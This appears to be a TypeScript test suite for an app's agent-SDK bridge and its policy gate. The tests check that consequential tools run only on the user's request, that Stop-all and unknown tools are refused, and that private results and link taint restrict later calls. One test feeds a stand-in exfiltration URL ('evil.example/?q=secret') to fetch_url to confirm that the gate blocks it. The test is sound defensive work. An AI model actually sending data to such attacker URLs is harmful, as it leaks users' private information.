import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { authMode, gated, serial, nativeSystem, orbitName, readMessage, sdkFailure, sdkName, sdkOptions, sdkSession, sdkTools, stepLine, toolResult, userMessage, CORE_BUILTINS } from "../src/lib/core-sdk-pure.ts";
import { TIERS, type PolicyCtx } from "../src/lib/policy-pure.ts";
import { describeFailure } from "../src/lib/core-capability-pure.ts";
import { STUDIO_TOOLS } from "../src/lib/core-studio.ts";
import { LIFE_TOOLS } from "../src/lib/core-life.ts";
import { WS_TOOLS } from "../src/lib/core-workspace.ts";
import { REA_TOOLS } from "../src/lib/rea-pure.ts";

const base = (o: Partial<PolicyCtx> = {}) => () => ({ stopAll: false, attach: false, pins: false, question: "news about estonia", autonomy: { "operator-build": "ask", "operator-organize": "ask" }, ...o }); // per-action ask path (operator grants off)

test("tool names round-trip through the SDK's mcp__orbit__ prefix; built-ins and other servers aren't ours", () => {
  assert.equal(sdkName("fetch_url"), "mcp__orbit__fetch_url");
  assert.equal(orbitName("mcp__orbit__read_news"), "read_news");
  assert.equal(orbitName("Bash"), null);
  assert.equal(orbitName("mcp__other__read_news"), null);
});

// core-modules.ts can't load under node --test, so its MODULES tool lists are read from source (spreads resolved from the pure lists).
const SPREADS: Record<string, readonly string[]> = { STUDIO_TOOLS, LIFE_TOOLS, WS_TOOLS, REA_TOOLS };
const moduleTools = [...readFileSync("src/lib/core-modules.ts", "utf8").matchAll(/\btools: \[([^\]]*)\]/g)].flatMap((m) =>
  m[1].split(",").map((x) => x.trim()).filter(Boolean).flatMap((x) => (x.startsWith("...") ? [...SPREADS[x.slice(3)]] : [JSON.parse(x) as string])));
const coreSrc = readFileSync("src/lib/core.ts", "utf8");

test("tool parity: the SDK server registers exactly the tools core.ts's loop can dispatch", () => {
  // core.ts's own tools: its TOOLS prompt section and the names its dispatch (navigateTool / runCoreTool) handles
  const prompted = [...coreSrc.slice(coreSrc.indexOf("\nTOOLS:\n"), coreSrc.indexOf("User profile (stated")).matchAll(/^- (\w+) \{/gm)].map((m) => m[1]);
  const dispatched = ["navigate", "read_more", ...[...coreSrc.slice(coreSrc.indexOf("async function runCoreTool")).matchAll(/tool === "(\w+)"/g)].map((m) => m[1])];
  assert.match(coreSrc, /const execRaw = [^\n]*tool === "navigate" \? navigateTool[^\n]*\n\s*: tool === "read_more" \? clips\.read/); // exec: navigate, read_more, then modules, then runCoreTool
  assert.deepEqual([...CORE_BUILTINS].sort(), prompted.sort());
  assert.deepEqual([...CORE_BUILTINS].sort(), dispatched.sort());
  assert.ok(moduleTools.length > 30 && moduleTools.includes("goal_status") && moduleTools.includes("rea_cancel"));
  const tools = sdkTools(moduleTools);
  assert.deepEqual([...tools].sort(), [...new Set([...CORE_BUILTINS, ...moduleTools])].sort()); // every CORE tool, none extra
  assert.deepEqual([...tools].sort(), Object.keys(TIERS).sort()); // and exactly the tools decide() has a tier for
  assert.deepEqual(sdkOptions({ model: "m", system: "s", server: {}, tools, maxTurns: 8, cwd: "/" }).allowedTools, tools.map(sdkName));
});

test("gated: a consequential tool runs only on the user's own ask, and never under Stop-all", async () => {
  let ran = 0;
  const run = async () => { ran++; return "Goal drafted."; };
  const steps: string[] = [];
  assert.match((await gated("create_goal", { title: "1000 subs" }, base({ question: "how are my goals?" }), steps, run)).out, /^Error: /);
  assert.match((await gated("schedule_approved", {}, base({ question: "what's new?" }), steps, run)).out, /^Error: /);
  assert.match((await gated("create_goal", { title: "1000 subs" }, base({ question: "set a goal to reach 1000 subscribers", stopAll: true }), [], run)).out, /^Error: /);
  assert.equal(ran, 0);
  const ok = await gated("create_goal", { title: "1000 subs" }, base({ question: "set a goal to reach 1000 subscribers" }), [], run);
  assert.equal(ok.out, "Goal drafted.");
  assert.equal(ok.verdict.tier, "T2");
  assert.equal(ran, 1);
});

test("errors: SDK failures read as the same plain messages as the CLI path", () => {
  assert.deepEqual(readMessage({ type: "assistant", error: "rate_limit" }), { error: "rate_limit" });
  assert.match(describeFailure(sdkFailure("rate_limit", ["error_during_execution", "resets 5pm"])), /^Claude usage limit reached, so CORE could not answer\. resets 5pm/);
  assert.match(describeFailure(sdkFailure("authentication_failed", ["error_during_execution"])), /^Claude login expired or missing/);
  assert.match(describeFailure(sdkFailure("oauth_org_not_allowed", [])), /^Claude login expired or missing/);
  assert.match(describeFailure(sdkFailure(undefined, ["You've hit your limit · resets 3am"])), /^Claude usage limit reached/);
  assert.equal(sdkFailure(undefined, ["error_max_turns", ""]), "error_max_turns");
  assert.equal(sdkFailure(undefined, []), "agent sdk error");
});

test("sessions: ORBIT's chat session maps to sessionId on the first turn and resume after", () => {
  assert.deepEqual(sdkSession(), { persistSession: false });
  assert.deepEqual(sdkSession({ id: "u-1", resume: false }), { sessionId: "u-1", persistSession: true });
  assert.deepEqual(sdkSession({ id: "u-1", resume: true }), { resume: "u-1", persistSession: true });
  const o = sdkOptions({ model: "m", system: "s", server: {}, tools: [], maxTurns: 8, cwd: "/", session: { id: "u-1", resume: true } });
  assert.equal(o.resume, "u-1");
  assert.equal("sessionId" in o, false);
});

test("images: one SDK user message with the image blocks before the text, as the CLI path sends", () => {
  const m = userMessage("what is this?", [{ type: "image/png", data: new Uint8Array([1, 2]) }]);
  assert.equal(m.type, "user");
  assert.equal(m.parent_tool_use_id, null);
  assert.deepEqual(m.message.content, [{ type: "image", source: { type: "base64", media_type: "image/png", data: "AQI=" } }, { type: "text", text: "what is this?" }]);
});

test("tool results: Error: text becomes isError, long output is capped like core.ts", () => {
  assert.deepEqual(toolResult("Error: nope"), { content: [{ type: "text", text: "Error: nope" }], isError: true });
  assert.equal(toolResult("x".repeat(9000)).content[0].text.length, 8000);
  assert.equal(toolResult("ok").isError, false);
});

test("gated: an allowed call runs and is recorded in core.ts's step format", async () => {
  const steps: string[] = [];
  const r = await gated("read_news", { query: "estonia" }, base(), steps, async () => "headlines");
  assert.equal(r.out, "headlines");
  assert.equal(r.verdict.allow, true);
  assert.deepEqual(steps, [stepLine("read_news", { query: "estonia" }, "headlines")]);
  assert.match(steps[0], /^You called read_news \{"query":"estonia"\}\nRESULT:\nheadlines$/);
});

test("gated: decide() refusals never run the tool (Stop-all, link taint, skill limits, unknown tools)", async () => {
  let ran = 0;
  const run = async () => { ran++; return "ran"; };
  const steps: string[] = [];
  assert.match((await gated("ask_agent", { agent: "atlas", request: "x" }, base({ stopAll: true }), steps, run)).out, /^Error: /);
  // pinned notes in context: only links the user typed may be opened
  assert.match((await gated("fetch_url", { url: "https://evil.example/?q=secret" }, base({ pins: true }), steps, run)).out, /^Error: /);
  assert.match((await gated("read_news", { query: "x" }, base(), steps, run, "[SKILL demo · tools: fetch_url]\n")).out, /this skill may only use fetch_url/);
  assert.match((await gated("Bash", {}, base(), steps, run)).out, /unknown tool/);
  assert.equal(ran, 0);
  assert.equal(steps.length, 4); // refusals are still steps, as in core.ts
});

test("gated: earlier steps feed decide(): a private tool result turns news off for the rest of the turn", async () => {
  const steps = [stepLine("week_review", {}, "private")];
  assert.match((await gated("read_news", { query: "x" }, base(), steps, async () => "ran")).out, /private files/);
});

test("gated: a thrown tool error becomes an Error: result", async () => {
  const r = await gated("goal_status", {}, base(), [], async () => { throw new Error("db down"); });
  assert.equal(r.out, "Error: db down");
});

test("nativeSystem swaps the JSON envelope for native tool calls and keeps the rest", () => {
  const sys = 'Rules:\n- a\n\nHOW YOU ANSWER — reply with exactly ONE JSON object\n{"final": "x"}\n\nTOOLS:\n- web_search {}: y\n\nUser profile';
  const out = nativeSystem(sys);
  assert.doesNotMatch(out, /JSON object/);
  assert.match(out, /^Rules:\n- a\n\nHOW YOU ANSWER: write the answer in Markdown/);
  assert.match(out, /TOOL NOTES:\n- web_search \{\}: y\n\nUser profile$/);
});

test("sdkOptions: no built-in tools, no settings from disk, only our server, deny anything not pre-approved", () => {
  const o = sdkOptions({ model: "sonnet", system: "s", server: { x: 1 }, tools: ["fetch_url"], maxTurns: 8, cwd: "/tmp/x" });
  assert.deepEqual(o.tools, []);
  assert.deepEqual(o.settingSources, []);
  assert.equal(o.strictMcpConfig, true);
  assert.deepEqual(Object.keys(o.mcpServers), ["orbit"]);
  assert.equal(o.permissionMode, "dontAsk");
  assert.deepEqual(o.allowedTools, ["mcp__orbit__fetch_url"]);
  assert.equal(o.persistSession, false);
  assert.equal("effort" in o, false);
  assert.equal(sdkOptions({ model: "opus", system: "s", server: {}, tools: [], maxTurns: 8, cwd: "/", effort: "high" }).effort, "high");
});

test("readMessage: top-level text deltas stream; subagent deltas and other events don't", () => {
  const ev = (text: string, parent: string | null = null) => ({ type: "stream_event", parent_tool_use_id: parent, event: { type: "content_block_delta", delta: { type: "text_delta", text } } });
  assert.deepEqual(readMessage(ev("Hi")), { delta: "Hi" });
  assert.equal(readMessage(ev("x", "toolu_1")), null);
  assert.equal(readMessage({ type: "stream_event", event: { type: "content_block_delta", delta: { type: "input_json_delta" } } }), null);
  assert.equal(readMessage({ type: "assistant" }), null);
});

test("readMessage: init names the auth source; result maps to the CLI path's StreamResult", () => {
  assert.deepEqual(readMessage({ type: "system", subtype: "init", apiKeySource: "none", model: "claude-sonnet", session_id: "s1" }), { init: { apiKeySource: "none", model: "claude-sonnet", sessionId: "s1" } });
  assert.equal(authMode("none"), "subscription login");
  assert.equal(authMode("ANTHROPIC_API_KEY"), "API key (ANTHROPIC_API_KEY)");
  const ok = readMessage({ type: "result", subtype: "success", is_error: false, result: "Answer", num_turns: 3, total_cost_usd: 0.02, usage: { input_tokens: 10, output_tokens: 5, cache_read_input_tokens: 900, cache_creation_input_tokens: 100 } });
  assert.deepEqual(ok, { result: { text: "Answer", isError: false, errors: [], inputTokens: 10, outputTokens: 5, cacheWrite: 100, cacheRead: 900, turns: 3, costUsd: 0.02 } });
  const bad = readMessage({ type: "result", subtype: "error_max_turns", is_error: true, errors: ["hit 8"] })!.result!;
  assert.equal(bad.isError, true);
  assert.deepEqual(bad.errors, ["error_max_turns", "hit 8"]);
  assert.equal(bad.text, "");
});

test("serial: parallel tool calls run one at a time, so each decide() sees the earlier results", async () => {
  const one = serial();
  const order: string[] = [];
  const slow = (name: string, ms: number) => one(async () => { order.push(`start ${name}`); await new Promise((r) => setTimeout(r, ms)); order.push(`end ${name}`); return name; });
  const failing = one(async () => { throw new Error("x"); });
  assert.deepEqual(await Promise.all([slow("a", 20), slow("b", 1), failing.catch(() => "failed")]), ["a", "b", "failed"]);
  assert.deepEqual(order, ["start a", "end a", "start b", "end b"]);
  assert.equal(await one(async () => "after a failure"), "after a failure");
});
